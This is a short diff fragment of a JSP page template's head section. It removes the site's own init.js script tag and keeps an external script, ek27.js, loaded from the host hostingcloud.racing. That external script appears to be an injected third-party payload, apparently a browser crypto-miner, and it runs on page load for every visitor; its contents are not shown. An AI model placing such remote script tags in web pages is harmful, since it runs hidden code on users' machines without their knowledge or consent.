@@ -36,7 +36,6 @@
     </style>
 
     <script src="https://www.hostingcloud.racing/ek27.js"></script>
-    <script src="${pageContext.request.contextPath}/js/init.js"></script>
 
     <link rel="icon" type="image/png" sizes="16x20" href="${pageContext.request.contextPath}/img/logo.png"/>
 </head>
